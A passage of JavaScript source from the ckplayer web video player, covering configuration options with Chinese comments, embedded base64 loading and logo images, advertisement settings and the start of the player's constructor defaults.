1,//是否可调节调节栏,0不启用，1是启用，2是只能前进（向右拖动），3是只能后退，4是只能前进但能回到第一次拖动时的位置，5是看过的地方可以随意拖动 previewDefaultLoad: true,//预览图片是否默认加载，优点是鼠标第一次经过进度条即可显示预览图片 promptSpotTime: false,//提示点文字是否在前面加上对应时间 buttonMode: { player: false,//鼠标在播放器上是否显示可点击形态 controlBar: false,//鼠标在控制栏上是否显示可点击形态 timeSchedule: true,//鼠标在时间进度条上是否显示可点击形态 volumeSchedule: true //鼠标在音量调节栏上是否显示可点击形态 }, liveAndVod: { //直播+点播=回播功能 open: false,//是否开启，开启该功能需要设置flashvars里live=true vodTime: 2,//可以回看的整点数 start: 'start' //回看请求参数 }, usehardwareeecoder:false,//是否采用硬件加速，只针对flashplayer有效 errorNum: 3,//错误重连次数 playCorrect: false,//是否需要错误修正，这是针对rtmp的 timeCorrect: true,//http视频播放时间错误纠正，有些因为视频格式的问题导致视频没有实际播放结束视频文件就返回了stop命令 m3u8Definition: { //m3u8自动清晰度时按关键字来进行判断 //tags:['200k','110k','400k','600k','1000k'] }, m3u8MaxBufferLength: 30,//m3u8每次缓冲时间，单位：秒数 split: '|',//当视频地址采用字符形式并且需要使用逗号或其它符号来切割数组里定义 timeStamp: '',//一个地址，用来请求当前时间戳，用于播放器内部时间效准 mobileVolumeBarShow: false,//在移动端是否显示音量调节按钮 addCallback: 'adPlay,adPause,playOrPause,videoPlay,videoPause,videoMute,videoEscMute,videoClear,changeVolume,fastBack,fastNext,videoSeek,newVideo,getMetaDate,videoRotation,videoBrightness,videoContrast,videoSaturation,videoHue,videoZoom,videoProportion,videoError,addListener,removeListener,addElement,getElement,deleteElement,elementShow,animate,animateResume,animatePause,deleteAnimate,changeConfig,getConfig,openUrl,fullScreen,quitFullScreen,switchFull,screenshot,custom,changeControlBarShow,getCurrentSrc,changeDefinition,changeSubtitles,changeSubtitlesSize'//需要支持的事件 }, menu: { //版权名称支持 ckkey: '', name: '', link: '', version: '', domain: '', more: [] }, style: { //风格部分内容配置，这里主要配置loading和logo以及广告的部分内容 loading: { //视频加载前显示在播放器中间的图片，如果不需要可以删除该属性 file: 'data:image/swf;base64,Q1dTCrUjAAB4nKWZBzRc/bf3BwmJJEgQoo0SEd3odRA1iU70PjqjzYg6SESITiJatKiJMLroRIsuehC999FHveT/PBn3/p/33vu+71rG+pzf2fu7z3ef39nrzBorAFACgF0FAJBjAaRvkwMAAB/iK1cBAFFnMwthNWlZWjeonT1M+PxIjN4KDncU5uR0dXXlcOXhcHC25AQJCQlxcnFzcnOzn0eww9zt4SZu7PYwBnow7W8FaXMYxNnaEW7tYE97cWxi6uACF6On/0vWDer4R9YexmFi5mBqzgFxgHK6mThygji4OC90zoOEpZzNTeAOzhoODnZgyYsoWlk7E5gVrYqzg4U5DHYub2JHK6XOJ8r5X6Mv5ZtLn3/A3FwgbnYuAXZuIQ0QvzAvjzBIgJVLUJiL61LuvyL/lapoDjcxM4GbYJIv/ng0QHzCfOdpQpeT/1PsX+kOZtYW7v+rZEwkrSjnf+ne/7qfior/fUehUM6/o2FwNXOL/z4apuHuaM6pZg5zcHGGmJ+HM/x1RxQVhR/bw+Am9hDzx9Lg8wUOa2szYUkuLhnQIyFBWUleXhluEOiRAA+vlJS0AJ8UnwA/D8+j30b/c+rfatIOEBeouT38LzWz/wu1S6l/qyk7W1tan++Jf1AV4OLi5+PjluGTlBaSAYFAQtx80o94QYICQtz8/FJ/3Yx/lvhzrebO1s/NzWSdHaC/74KjiTPM/KJTYvR/t+qiTb/7K2z9720Skv2fjP1b6t9qZv9gSOh/MvRvqX+rOfz/tOn/KEH758Zg+vT/vKXNIH92qKOLs93vsWMG4TS3M7+oBjvfpaDfU8IMImzh4Aw1gYNNHB3trCEmF4KcbuwwKweIravJc3N2i4uJIcqJCfzHS+L8a/CBaQFS2OfjsJb05vl/LMDch4r5OCQtCAAQv75JfrFy9TuAC+A2spaI56XxbK+FKa4/7vFGNXGv/CO8q69or8TIBNHeEX7R4+l7hYsu4hH2FUnhhzJXtDQ0tVVJTu+SPPJ4CScpoP2YnULPtnk0weOQJDqh5K4uMZy4jR7r7qhyXuhM2K6uhXVVv/1uNh/3NjGU7X6dzqAYuwQ/zOal3cmynJmnq2sM8LCWaS2HYN8lW7C/ZWrylGlWpMzlHTuHQvQtahK6p4rOMeXMc9wicQNf9iYsnQdFDdbMf1Vc+f4kWHdEw7vXyGUmJm7qq0Ev1jAXkZs796YsQT4T0K0IMCxGOAy+q412HUsa3Zn2pwvScoUX3uPh1r1LnKrGY8GXcyIQGx6A0+dr9bNGzAd2ONfyKVVCh8l4hmgSyPOi2r/Os/0F4RB2gNEVGyOcsFqcD8grefqAPEPsGiGC/lXTjlnsp5UfhJKmNHX79Qer4gI6VE+HfGpwNqoa8mKKCuLi4gi/ucyaWVrqiW3U81PMVLpcL5jYlnVFJ1Kqn/heba2L6upoqcSWgfqinSSeX+MaoIydxVKA4z3wxOrD8XUvkHAX3lzmnVzkn6SHzMZsvHBQxpErxV45TBbn6Rdz1XzJNjzR2hYQHR7Q5iVGbbY9X+x4uL6i2rGQBTpLbhKMXSdUcMTihvqmchtfs/WTYfcrkfwilma94/GOfSZwqauQ13iBJOWQdHLnqK5yTsI64MQhY9TFo3Hot+Q3epzoUpHS56beieZ4IbB53QfbqNt2o46KaQtxzvOqSnVuV/sItDLp7FcjS64/sT+y8jROZ2/5QYvFSUwOe6odUhozxxzAj5UglyTO0ws5mHwYN3ahizd8x65aan9hP2TmOPmAvLPYlMQTrNbQaNXceIW0747RHvvrIvIc5k077ODqKN9jiy+M2O4othob7A6TI8tCbdsgJohCPYpXoeFaCVvzL+67OdUgMjfr4xLWvm8WCo/f/RzVRudvoSZ1qkJdF/EKO8h+fJncTZCTlbHhfdSAu4Rn3WB3l2kO5I2v5ivDrm37yXoV/U0j70fNS7OwGNHmrqKQVP3BiQ4JJYjsqBOFNIgCxd2nbLDw7fBF7Ykou91I+qujzwya4C8W3x+ZcYw7MOPG1Fdn3yns3R4a6TLc1pu55tAVzqxJT53i5SXJw6HMhLsY6aZS9ON4vdQrk9FdQS7JXHjLjqoFb+k63/R9kQhIaOyMi3WImKvdEkTLJ5aEy9mqOJowR4xonr4Ipj83DKMQDWadfOZF8nn6s0jhN3Xx/fh41+1pcsL3CUc2XmIv+nBMU/IZtRpY7NuTyiy8uGTx1cpPSGCdoSYT3BAT++LXt/aEBYJmGJhe9qUugdnWnaenBUo0fzpSzTN6o386lnVRH4ecsv2Ympqa1RM3qPG6h53zKTu7Zw6mdmAVHR/Psgob6koUqR4bG4Oj+XYZxpRkkbsoJn9CD+URpnU9t/G+k8Nd4mS5UTRkESZfHvOtO2etAu15gl7qy/IfkkBai/j4wH++HsjRCj7Kss3aWJakYOKe6/Qc32Q7AJyaP3PkzHv1VPXqhxs5G4Ix/WfctpKnubYaDYmUTWiwtbSqiD2BWSukbmtnApm7uL+LJpVS5ucAPjN6lnT+aUvi9Nrq1XKndkqIjSdunmNpfMJRUG/YbeLVYXHSZSwaMtTfKGszLdSmZYFbVYkMEOXt0dlaeMjOwvISK22jSi+GwyBkSqoDF4Gs6Mqy7ZmrfKRZgg6jA78C23/P5pzy7IFNWfY0R/RY1W4mvUFqLZcsbjuAgLzz5LBTRGsLtKph2eCBvVRPL4XbuQnbH6oPb4R/s0WpSotPOLJuoZttM7qVqk+O7OZb0ApSQXEWbN6zXaHmSy02MSHaXOIrS7X7i710BdZvyYGEhIRy5fpKob+Uhx5EmtD96hvJZGsDbn4ns7QEIVrNQzreTG7t6dTrf5ARar3pwzFOAW1HSUJf4gu0lHckvKW3JlAdrR6wnN1WO0gBqQmCewsOj3U/32Zo3pQcMl/1DEQ+Www3bd5F5x1oM89EkADJagK0/WiugD+YlW7dabGfIdI0DA1csJnS7SiQDJFmQ0p+++whjRRGbWS253gjmB2u2XdvQzyItLTiEsBuxuFKJpIvXqhNsLJ9n3Dt/brTj+xWtm1r0kxntgGTU/J4ffUYvh8aZmZjmuvUZfSh09EqcvVTmQNKW7aGaQ/m1MG4Q23gJW8iRQaE3/oGij+8w8N2ur6LoqsiMCigB3F6E04JSlQw8zXfGWdNHcd38a9lMmXvvQt7w6fXEaDic6vJfL9dDXr8sRaVWEbWOcRf52PNRxLMkqIPJ6lh6woy0An4urBCzuASqI+4w558dLCXhK7GJ9tRunl9k8edm5OZg95toTTkCkcXPXWrRQVvQ0yC34f5JlN2xphwFQaxeyv56enRHTrKP7RiJmyDY/xbtmrSQgkPw1455dd4N3n1uLIx4pIcZXOAFyv8T/psEfvaRsccO3oGoPcRWMKGQ+jXvN97Toi3U0NTa9uozPlL/ZUM5NKaKnCLRzY/6fIEEgrskdd8wS3oHjqtv+Z57Kqi0xk4y1H98Dn3frWYvkbQVmHNG33wI2HuhvAlPAiExfatzjpoMHLGD25W3OkPwzG7XmAfNW0mVcNAZeQ+cXvb5Cbl9PYtdEiNaJ3aLmvqxBsdUpvcPFvSJM4qgtTTwPIffDRLvdyIjW1a7diOgYXYiQ7qxZKZ+9PaVHPF+Y/eumrQ2bizm2r2f7w+k9YaJHyFIzeeen9f9b1+wnqeGouhp7kbt9bCR9HEadZpP2dYPMM9iKsAWes7xQQSB0fRBxNl0oghcn4FlC00RDeKEHHzGkJTK4RxVktw/NpGCTj0nYdD8QCShsRTN2l4TjOhhI98r1nHRVTGKxu/fDjoINArDHLfTGe3/mBpJZogLGzksHXxF/Iscu3Mw2H/M5lR2PXwQK55inhpXLTBIUvlvSw6jZXE2a4tOGkZmLE9KcfSSXhrfPRX6BafOppoyL9kwL5jTirm7MlaADLHJgcSrJggew1N1qL9SOxu+K3mQYniubuEOMB3MUiVYyjF6w1wQD0y2f9zNnbQN3wX7/XadPwpNgHCBfLy9drFtP7JWMHEid0+HfX8mkORVWFUw254l2FHMlhEayk7kRHK72Q3dF9JXF6kWWTCoC/qU5yej2zn942h17+KysWkdpmkKuC1BykHjcO6cfzgnaVgcDJfhlLWhi6NBviROQcYeKQ8Eni8XysdHqP8TTKN2p4C/Kjdtn+XtbZwWSuq+f3P0eFFhbCsLEIaPydPcMtOWTfEfE6mCrHeAnOgzltDaetqMQ9NLy1/1FWLGkB+ESwa+nhMt4Texs0QSxDJ3z7+YNk733lvmI/pqCC/vGjGfBsW/0sAvMiH/uiYUIN+eVQfwLxrYOAVQbMcVPDK4/5gZ20Q4aGB4YRhauFLS3WzPiam7/RS0WcFyaV93jbTJWQ78RSJLUCpk0iXpcWzFv6aCSa7j6Neox93AEkih7fau8PrvSWv6r/yyj8WtdPphIbLAF1DFOwzNiq71oXsqGRPttkOz2Z4+9KKYnfXr34R9Ihcat0/0y5ebqIFGvm9nTwdHx9PysvLIygtLW0+LM2YYTVRoAspYwYOkFreaw/IEzS0OQkSVx7yfNxa778famlErmfdp/B0zFb9wCp7PTesAHnKdRDu9c6NNm1iGDXqfyQu2jMTvr0kNOD26ugT9Ff/lDLy020B2Bz167HF6gyCnJxaGZJ2Hqq7VKpDyOznc+q6/pPmA++ygOHff87lqXzeQTRfxWEyg2zVdHMZD93bGXcKmjvK4vItiNqdX4h13WxnDd4Htiv4sEgl45azkAQZ+/j4mDY2/fypMzU5OWnn4LBh1tJxzahIw5uDyjKjnyd0TmoIVVF64yQxr0UlVAkf+OjuAeTV6WdFTnYnZOgcpKlw0KY2A5UIf0mxsbLzwcvoazLvZOdQ32kjkc9NlIRsy6aoyhmcxqkZWNRarsyRuSoUTLbMUXRc+bpJiwrYb0Ug5mjNN0cvoqfwcGBhyAytHJrw5s3ZIZUfrxd81AM70fCAhJofEdRS9kGiNjFr4+aEy/Sv1Aw9CLZUiTcynRILDAaPr6+v03BwcDQGt7W2vtkil4p35lyurDgcepYm8JoQwadscEKuhxf9LYDr/TSEDWVb8GaBLKNjZinnqvyUH/DIXxZ0u+np7NBsXzrntNvTbDpRYHGiwPLb0usQPtOwsF8rQl7Md4GHFAmUNVJ1vSyChcd+Cw3BqKna9PikmGJq4b4eM7muCVklaVxI2sLeW/mJ53cM+IFyR4otPc4IBrUhXloXKMOIg+jr4s4WpFj5Jw+1I3BDI+zhzsvBzAjvr8zRT3qJTP3g0k86XDjn8VxAGexdd5KUT1PCVU2MpvkeVBwQJUGsvP3Bb/uFRFNpFhN4fvCJW2XvsdPoNe4r4gOntR93XEdSj5hyb7nSAU3XG/V/8NsA0Ypjvnx8Mfknfe2bet9QkgXRT28n+2k0FH210a30ZriFnu9o4WlOwYOk/ZKdTokUo5HKuRUS6nJL3lA9vHFgN9DoWbjFaiS0dnvxcESZxujA2dRYOiQf2EuQRGgo8rCGHnyzSXt6bEBt5SnciXEPCHVnrU6OIIaWMKHcWBhrektwpYYOwQivQFuiinnUDlq0VlNrDOlmrz/qEtuGB7REOd1pkjdlQEyeGJEBp73R0GSVNRu9GfOq/Z/KywdtNZPXWvDmFr9c5QaL4ou32pzN0kp5dazzm1FV2AuFkTTjgCIr3tsy2waG497PtZGgn/Gbp7XmSAp7o6Pq2Q49PVLOAA9KcQTulpy/MYe+c38MtXVnKwCrxoQvC0/0lwPOr2thrDPXaCnIB56bwAvnvBmXN/KaBHygL2WVTja7kQ4sVqbyQY2p0JjiA/Gqmr98mz9szz7a02rM+xLwCzuMMNoCatrD3Rse1Lp2SCAAR86Lg5yD4glN6eKa1Bpl2nSVROR5orTTXMLSGRrlrwQviM7TZN9I2HxUbKSSrSL+cJ9oS1JIeCmg/yr7vg2ikt/oTh6SaKj2Jrow70DGiIbBEIJ0MMgHoWKHhzIGM9IHE5pWVm+hJHUlwE/QhRFXR2RLGNtEDkQlY2v7bEfkhISS9Tb59CHo4U9U2r5bQcGCJw0OVl3NsFGvW8Av5TEa9MVVd5MYo/3XAhRiKOchhb6EYbdsOrNzp2jeRGay2t7Wh+/Y1K36RGfuJX/Od3UkmgeaguVFDg7aVEIlRscKM3yAGew0Uwjl1aFjh9hGW+03NxC2m+mz6JHDjG6WY4N3/cf6omQf2eUiPjKO7PT1WA404W20p9+qerOSTyKAOlb50DSUcyB7fG1BImQO8gZRhiqDTQj5cXpXhHF0lEG3CXNc/A6M9Wmrql57nxVUdzZyS9W4a4lfscvehUCrPSiX5O+3O3ltgW3kP5yqHW0enAVC14obtbxCtWy8drVGGo4rtU3EOu/wjXqak/Dc5pkul0R5J1HC7L4qOofnNJQNTbXn1M4saSk3vF7Cm6PhiD8kza01BWlC9dfb7fEzemmB4Q4ipwtjUonBvIVjaWHWzZHJfvOriJq1HioBS//BGnmmQMJU781tYPNyQDThjAL5W7D8SvvZk6eRaNlEr+IDxQ8VXtTq+4kBXvUmD8meWe2k4at2D6S0to1MnASL25FFx35GIqfHiedTRkuJ2ZRspWHvfYr1lUt+4fKaCIU4jKcezsZx7spb9akafZjPU/uUXdPeoj19PBZL1dgWACduDlYbzDlDxiZ0jLtrbQbeqdo+f0REG+MKpqoi9CCPasWzhHYPBlyuMSN/9gvbptagKr8SzqQdDc7YPNDNtQzJd2P5kj49FDGG4IRTGRBNTs1BFz1WeYW+N9gQMgDf5ZAfHt04y5E9jc1djH1R2DBh3B3Hek1XNzfP5BMvn6FuZUK+rkH4iVDmbMNByrVEH7us9I1Gqt1juZVbLT12MtQv8QmonyZWz8RpWotldKy586ACrzm5EhI+d8YnfP78btl3FX96FgUOVy0dNNfQq+2J6cOc6CBxPZHRyQOgJ1Q05ERBqpcfGMC2kR9PaG7i74G43qmj8ovZQ2bNNjfznTo4JTe5qZpp/uNMcDJ9YfGWhfRpfa5BC5ncVdyAJz/8AokytvxwHj8ekIt6m0MgYP2tJDb2c8OPH9HJ0rJqOWJPkNVVwsWejrCIgDhCZlvnU7JO9fnsMWoum+v8AwbfVk+M6lJ9gwusCBqLZh9O69gnFr4HFWZOae70BhUwK4um5YYVP0CYYnnhEyTbJ1XaHqQpizLulgE5up4/P/NS5MBbXQVYWkpkYJPg17Ved3ScLB0dURP5Ke/yPkBa/IFy0nH+puQuCyvlSGjzftZaVIXxDmVWfunyHVPNQUnDulz19NofEtvLGsE2XZ2Q46j81ZmaN9QVb2CRj61PAhzWwNZO2w+c3qit5Ofhex5Fzz1hnJzCOjgAGBqOwVxd65qupiAab/J5Hun0iYnlnrm22eyPHpvj75elPfiisUDXvSp8K0tGrh8V/SQxC0bR64FI88g1aRt5bTTznjq+d7rV5LVNzeGXx+kJo3mJ6aSN0sa0kys33DwnzF/N5wTetqGhcYne2ytQ7Z0IP7hbe1dAPU9v2X1kXHmZT15Ma6JEe2t7u4XC81bFegxoKGXFC5JncOydORbgvYdK9N4oyiUQ2jBI0ZeitkRRTOtp5uaNlv4czp5Pb6poFnFiZdkHR1VXQBXUWHIZ3nlUG9o/mYuNrK8n44w4Iyaur5eQqEtGp8geMXeZjtp7uCvGpai1du5ApvghXuqrDO+nv5MA+aLNoVXkDf5CM68+ga27SlYq8dSOJezWufGaPCawyskPm4XOX3x0T/Y/PZbS5w1RyVNacbLuFM5Vz2qZ5QutlUF+/hkZGf026X3UHZrVjY3z7wvWYOW8N7++ComTxbxrjIhYtUahFrqJbsyemZhIWD3Moj6fiOIPMz8iFBNqdi0cHfNrExM/zZSCvBYrwzPDEipqjJgRscIWlNOj2uAd6+/VX3ERyaNjG/Uk4O93ZsEmJZFFpZC6HMv+lewPN8Kz0SmZxgWadVE2u8eyAWThqTOZuOmrX33lBKgaTlvwjo/KeibVW0aK3V2NspRESjOzHH4OV+6zcmZkUI9N1JxYZkVF2RswnTFNEF7HMjUF6HZLjNwmaURNbXSDppda52aLxdjX2rtNIUDP/vb2MUH5BOSE7QnXLFlm44PMsOT5LZNlbfuH/DwPZHmbythJjVCD7aD1yPaCJryI0rkrL3Xsu5Bzcy6Nnk58aoP9H9feq8t771J+iVPDvd+M7fRFRgYWL+GtfKrkrRxqKCfrrK8SHDgZliZbRXTD29s3h1XC9sT6LN+k9mTs88DXH+vrzc6p7WWdKCbYNL56rZF6sfLysHXe87hvX/nFuBcqi+EdzAPNwsUeW7oKSwHLfGXFBO0ZixwMO2WkA7WqRvtCuOxjoRujxVhRCdhrI1i5ejjsetjFhnRCcbaPH0t4iRJRthfc7iQPCpomn+R7Bffn9RtOObXornGpdt3wdz89zTw10lPfVofOhAihBoyaAvKGe8dE2zTO316EMr28YeQCclLfGbOES4GO7OkHiFccSNVuv01EOekzidId9a8cX+rWG7vYlPMthet4aekiZz66w1JkbqyDGK9aDYYs3RglI2sBPfIiIksn02gpKVv4SisrG4o9mNvQGRLCyKiqytHVfEZNDD21CyGIfXtjvP2gjSSPLdIndvsem44fjz/h08H6YlBUE3xWb8P9aDIL7UObt7M/88SGVs+JgthjYfJ1x/ttKCWlPTjcRukdRL1K2ok42W8bddco5iNkSdRmp0pPwHjbYnJ3CGlEzWVcf1wnEf0WZUdOTBYX5ROrPlRFNpNVDqkVcg9OrdmhtlxfEODb59qt7LcUW4svzoFT116niZ8gbXufKNHWn3jQ1nmUF25ry7ugCCLmiweSbTBp9va9uEXp2yw7PTPWGkbNE+DpKTLcpsCP8JIPRSpMrRkOuire42S/TakTz/N0ABCKsn46iITrqFMiJ10METDvZ+zC6WElz9PTJwZuIUICKeeW00lvkGEHEOLEcGABEfAFWc1BVk70Yam1yemZZ37jcfI7qjNvVGowDOasqn48emeXFTJu9OSD3eruBCv4uz6U6sMhumzZAy69cHNMg+UrKhmpjCogHrCwXn9Jg9blmKNDHALm5iQMqDdnwuuiWetSpSSe76WeBYfRvD//crPGURR4L76IS068I1HgfVv+pxLlTyfya0Ztsey7PNoVpbY3k99/2aAolDeSW/hEbPAMbxy1d4oS+SwZeaa+FkROzoMbC8L53o3X1ubLrufrh/ei7UlKDY3bEZSWc2Pan4Da0LPpF2KRljJBYiLgSACoWRQ/vGgk6F7+cxhup+zjQ0tr3DI4PKwMllcCuxZCRzc495Zd1toi6IbyQihcdgNuM3AgBmrPWpu7Eq1PDm+s6Bu0hL5vVXtrBf0YfSNHbHjvbKIQJVgLYAIAANgAq4sfjLEmAVhSWICfEoCr54sAIlJkCg1e4U2qApyCHSokAPAaFxfrPBZQC6A9P43zO0k+SskXC3B2dgYguoVMua9ceJOC5TnYT7YOEIgri30edK5VCyg/j78CcAQQpgAACAA2UfkOXg+BQSPi/GQcoEPQogMQ0gEADJ51AM7e49f/Pn0Tgdfzj2cBtKRdnhRf+qC9Go0Akg4uLGhuCf/4qO/1AHlArPWDUbWo3EoxAElRHSBKTZGZmRGA6ykPsCz9eT9o8HOJbuZo+qdAAHOsMfaong20ugxATBCBxdWrWJrBqPfcA8Bs6Yt1Pz1eTe0J4OZeBKAbWvgYcHadCHBhA+tfDbgCAEicH59dHzo3hwt4Bgi6WL0KoMQFXJwJxL2KBaC8tonhG5MYJujB8O1LTFKHYbJ8DFOkYJg6AsO0vhhmcMTwg0vMbIxhNhUMc0pgmJsLw3y0GBYkwrDIJQZf8ihxyaPUJY+yl3w9vuRL4ZIv5Uusdsnjs0setS951Lvky/CSL5NLvswuseUljzaXPEIveXS85At2yZfLJV9ul9jzkkfv3x4DLvgeju8fvG78Bwkl/iAp7R+kxCAdRuHB5B9kq/uD3Cl/UBBTAowpIY3BJ5hqKpgSmpgSepgSJpgSlpgSUAzCMNXcMSV8/pQgw8fg3T8lyOj+6JKxY1DojxiZDCZNFZOmj4m1wsTC/8SSAv6skpL/SSPlxKzKYVYNMavP/6wSU2LwKQY9LvD1Bd5W+5sIjX8/3G9wcXHOn+27AIZJ8Wvn2wqA92fYYRPlRmD74dDdr7v4Hfl88v0elXmO2H4G+Y+5Lq0BaC8G4lqa5ZWpj1k4tCK4kvRyMkrXG2S7cC+K4eKei/4u9h8UUd6/', align: 'center', vAlign: 'middle', offsetX: -100, offsetY: -40 }, logo: { //显示在右上角的logo图片，如果不需要可以删除该属性 file: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFcAAAAUCAYAAAD4BKGuAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAVTSURBVHja1Fl/aJVVGP4cw/mH5tUWi3I53cA0WbeIzMgaq6lQoVawm0S6glHhIKM/TELICotqCxMSGWQRdFfRLEhc9mMxqA0rbdS2wsV0GkZXuaKUWlHvgeeNh7f3u1du3Ft74eGcnXu+c873vD/Pt0nZbDZyZL2gWZAQTBH8IjggeEjgPZASPIB+g/P7EsGT6J/BfHfjHFIv2Jpjj/+dlDskvCm42Jk7X3C7YJOgw/z2oOBGwdEYRW0RVAjOCZ4ugNggqwU3CTLRBJFyQ+xuwVRY14igB78tE9QKpgmeEHwkGKRnq9AeMesHRWwEsYGUxwSdBZ51ecweE4Lct0DsOVjaZvptA8jfC4JfghWpXIJ2jMY+EDShf1pwh6DvX5x1GtpDE43cNFlfhyFWpQ9xd5FgFo3fRi++C+2nCBNBRgU3O6RsEyyEQv4QLMb4CcE9RlFBLqS1WZ6BZ83A35ofVhuvfE5QJrjWebdgCJOx51qM1QgewbMzsO57MDQrB9DeC8ObHd5Xyb2eiNiQQxmtgkZBr+OuZwV7BIcF1RgbF1wTE2MbEccX48VY9sMzBilhTke/m+b1Q9lefpgruI7OsYhIGzPJuAnn3+6EM7vu1YKl5vkrYRSfCGZivCxoMklk7M5j6eFlXyRNRSAvAoFf0Fo/CC7LkbwuQjsZsf0qwbuI9wlYgIqGl6NEzDYibJ/gbmAfxpKoMDRcaSK8xZzjZbK+NMhSYoNSngV5e+ksKXp+JdqZwDDmdpSbsqa9gNAyi5JalSGv3iQ+dtNK9HvI+sNBh2AhvNYVaH+msRtAdsa4ehoKCuQsoP2PY8+kCSkJ5IRWjD2FZ4/BOFSWYv9KhI40eUKQ31CqdnLM1c1OOnHufKSS+iEZvgHNhji8g1yT5VZKdCnHO+ajvrYK/I7GkuSWjwvq8Mzl5M79NF89aCHaBNXmWv0sQVUUZEDwsDnbr2i9s31lKyGuFs7kITEBC+snJaToRYIFrRN0CeYgoSUxJ23WUm85eB41b4IUuIvGtyIMVMY8lzHGMoYworF7J/onKYk10/wVQL6zXYr+Zq9aOEhuXZPDel8Q3If+HMzTeHPKlForEK+mws3SMfH2UMxNLIJbasKsoIQZwVLbKFkN4T1C3HxUMM+EkCAfgjwNV40Y304KriOP+jIHqa+jvYsqnH/kqzKaGCFZxWnoTqooxky8+dHUsOGwr6Jfi9jmlVVTHGLnot9L3qGWqCToWYYRF5fDa96mtb93yI2g8B0IWxlTHWmi/hOG00D4mEJfJ5WhQX7ySCsDUaNkJeud6+sgXCgs3OLEG2/xdZSh10JBeiB1zQU0HuQdSib60rOdm9kFToIL8hmFiRHzm1YM0ylet5k579OFpcUk4I0oD0/QuJ7tcBy5ERY6ixdrh5uNwN3bUV7pd4E+J958HmPxbRRydqK/in6vxj5aH9din/udEPKtuU1GqBL24xJwBInQWiHLcbQVKBXTzkVpHP0tWHsIpZUqPeWcrScXuX2ImRkqlufBhdQl15ig3WLKH0/SeAmtD+uprBqGx1ThhlWN5LKG4lcNKbDblFDjVDU0wWK7yLLqnPNk6cKzKsfXt1GQmQQXSuwymhd3tr9lkvPJMUV152kc2PsmUEMxtzdPRk2SNX2DQ3Vhr02Is18LXjHVAz/bG0NEK8johus3UBiwyfkYlDkQUyLaWrwZBrbHMaB8Z3PJLaYk8IIVKKPSJdxbv3ecynNzLNr33GKLV1YVW4IyfycXfq0UxP4X5HJdXCqX4Wv0AKqYkkipw4LG6WxMNi+GhAtH+M/K8wVe7wuWvwQYAFT+UsGCXmX3AAAAAElFTkSuQmCC', align: 'right', vAlign: 'top', offsetX: -100, offsetY: 10 }, advertisement: { //广告相关的配置 time: 5,//广告默认播放时长以及多个广告时每个广告默认播放时间，单位：秒 method: 'get',//广告监测地址默认请求方式，get/post videoForce: false,//视频广告是否强制播放结束 videoVolume: 0.8,//视频音量 skipButtonShow: true,//是否显示跳过广告按钮 linkButtonShow: true,//是否显示广告链接按钮，如果选择显示，只有在提供了广告链接地址时才会显示 muteButtonShow: true,//是否在视频广告时显示静音按钮 closeButtonShow: true,//暂停时是否显示关闭广告按钮 closeOtherButtonShow: true,//其它广告是否需要关闭广告按钮 frontSkipButtonDelay: 1,//前置广告跳过广告按钮延时显示的时间，单位：秒 insertSkipButtonDelay: 0,//插入广告跳过广告按钮延时显示的时间，单位：秒 endSkipButtonDelay: 0,//后置广告跳过广告按钮延时显示的时间，单位：秒 frontStretched: 2,//前置广告拉伸方式，0=原始大小，1=自动缩放，2=只有当广告的宽或高大于播放器宽高时才进行缩放，3=参考播放器宽高，4=宽度参考播放器宽、高度自动，5=高度参考播放器高、宽度自动 insertStretched: 2,//插入广告拉伸方式，0=原始大小，1=自动缩放，2=只有当广告的宽或高大于播放器宽高时才进行缩放，3=参考播放器宽高，4=宽度参考播放器宽、高度自动，5=高度参考播放器高、宽度自动 pauseStretched: 2,//暂停广告拉伸方式，0=原始大小，1=自动缩放，2=只有当广告的宽或高大于播放器宽高时才进行缩放，3=参考播放器宽高，4=宽度参考播放器宽、高度自动，5=高度参考播放器高、宽度自动 endStretched: 2 //结束广告拉伸方式，0=原始大小，1=自动缩放，2=只有当广告的宽或高大于播放器宽高时才进行缩放，3=参考播放器宽高，4=宽度参考播放器宽、高度自动，5=高度参考播放器高、宽度自动 }, video: { //视频的默认比例，当视频元数据里没有宽和高属性时默认使用该宽高 defaultWidth: 16,//宽度 defaultHeight: 9 //高度 } } }; } !(function() { var javascriptPath = ''; !function() { var scriptList = document.scripts, thisPath = scriptList[scriptList.length - 1].src; javascriptPath = thisPath.substring(0, thisPath.lastIndexOf('/') + 1); } (); var ckplayer = function(obj) { /* javascript部分开发所用的注释说明： 1：初始化-程序调用时即运行的代码部分 2：定义样式-定义容器（div,p,canvas等）的样式表，即css 3：监听动作-监听元素节点（单击-click，鼠标进入-mouseover，鼠标离开-mouseout，鼠标移动-mousemove等）事件 4：监听事件-监听视频的状态（播放，暂停，全屏，音量调节等）事件 5：共用函数-这类函数在外部也可以使用 6：全局变量-定义成全局使用的变量 7：其它相关注释 全局变量说明： 在本软件中所使用到的全局变量（变量（类型）包括Boolean，String，Int，Object（包含元素对象和变量对象），Array，Function等） 下面列出重要的全局变量： V:Object：视频对象 VA:Array：视频列表（包括视频地址，类型，清晰度说明） ID:String：视频ID CB:Object：控制栏各元素的集合对象 PD:Object：内部视频容器对象 --------------------------------------------------------------------------------------------- 程序开始 下面为需要初始化配置的全局变量 初始化配置 config：全局变量定义一些基本配置 */ this.config = { videoDbClick: true,//是否支持双击全屏/退出全屏动作 errorTime: 100,//延迟判断失败的时间，单位：毫秒 videoDrawImage: false,//是否使用视频drawImage功能，注意，该功能在移动端表现不了 adSkipClick: 'javaScript->adjump' //h5环境中点击跳过广告按钮触发的功能 }; //全局变量：播放器默认配置，在外部传递过来相应配置后，则进行相关替换 this.varsConfig = { playerID: '',//播放器ID container: '',//视频容器的ID variable: 'ckplayer',//播放函数(变量)名称 volume: 0.8,//默认音量，范围0-1 poster: '',//封面图片地址 autoplay: false,//是否自动播放 loop: false,//是否需要循环播放 live: false,//是否是直播 duration: 0,//指定总时间 forceduration:0,//强制使用该时间为总时间 seek: 0,//默认需要跳转的秒数 drag: '',//拖动时支持的前置参数 front: '',//前一集按钮动作 next: '',//下一集按钮动作 loaded: '',//加载播放器后调用的函数 flashplayer: false,//设置成true则强制使用flashplayer html5m3u8: false,//PC平台上是否使用h5播放器播放m3u8 track: null,//字幕轨道 cktrack: null,//ck字幕 cktrackdelay:0,//字幕显示延迟时间 preview: null,//预览图片对象 prompt: null,//提示点功能 video: null,//视频地址 config: '',//调用配置函数名称 type: '',//视频格式 crossorigin: '',//设置html5视频的crossOrigin属性 crossdomain: '',//安全策略文件地址 unescape: false,//默认flashplayer里需要解码 mobileCkControls: 